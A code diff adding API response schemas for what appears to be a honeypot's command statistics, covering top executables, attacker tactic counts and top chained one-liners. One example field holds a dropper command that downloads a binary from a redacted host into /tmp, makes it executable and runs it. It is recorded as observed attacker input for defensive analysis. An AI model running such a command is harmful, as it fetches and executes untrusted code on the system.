@@ -253,6 +253,107 @@ class HeatmapPointResponse(BaseSchema):
     )
 
 
+class TopCommandResponse(BaseSchema):
+    command = fields.Str(
+        required=True,
+        metadata={
+            "description": (
+                "Executable basename bucket -- '/bin/uname', 'uname -a' and "
+                "'uname' all collapse here (IPs redacted)."
+            ),
+            "example": "uname",
+        },
+    )
+    count = fields.Int(
+        required=True,
+        metadata={
+            "description": "Atomic commands that ran this executable.",
+            "example": 96,
+        },
+    )
+
+
+class CommandTacticResponse(BaseSchema):
+    name = fields.Str(
+        required=True,
+        metadata={
+            "description": (
+                "Attacker tactic: recon | download | execute | persist | "
+                "destroy | shell | other."
+            ),
+            "example": "recon",
+        },
+    )
+    count = fields.Int(
+        required=True,
+        metadata={
+            "description": "Atomic commands classified into this tactic.",
+            "example": 312,
+        },
+    )
+
+
+class TopCommandLineResponse(BaseSchema):
+    input = fields.Str(
+        required=True,
+        metadata={
+            "description": (
+                "Verbatim compound one-liner (a chained/piped dropper script), "
+                "IP-redacted."
+            ),
+            "example": "cd /tmp; wget http://‹ip›/meow; chmod 777 meow; ./meow",
+        },
+    )
+    count = fields.Int(
+        required=True,
+        metadata={
+            "description": "Times this exact one-liner was seen.",
+            "example": 7,
+        },
+    )
+
+
+class CommandStatsResponse(BaseSchema):
+    """Command analytics envelope returned by GET /api/v1/stats/commands."""
+
+    active_sessions = fields.Int(
+        required=True,
+        metadata={
+            "description": "Distinct sessions that ran at least one command.",
+            "example": 151,
+        },
+    )
+    total_commands = fields.Int(
+        required=True,
+        metadata={
+            "description": "All command rows recorded (atomic + compound).",
+            "example": 1840,
+        },
+    )
+    unique_commands = fields.Int(
+        required=True,
+        metadata={
+            "description": "Distinct executable buckets among atomic commands.",
+            "example": 42,
+        },
+    )
+    top_commands = fields.List(
+        fields.Nested(TopCommandResponse),
+        required=True,
+        metadata={"description": "Top executables by frequency, descending."},
+    )
+    tactics = fields.List(
+        fields.Nested(CommandTacticResponse),
+        required=True,
+        metadata={"description": "Atomic commands grouped by attacker tactic."},
+    )
+    top_lines = fields.List(
+        fields.Nested(TopCommandLineResponse),
+        required=True,
+        metadata={"description": "Top compound one-liners (dropper scripts)."},
+    )
+
+
 class TopNQuery(BaseSchema):
     """Shared query args for the top-N leaderboards (passwords, countries)."""
 
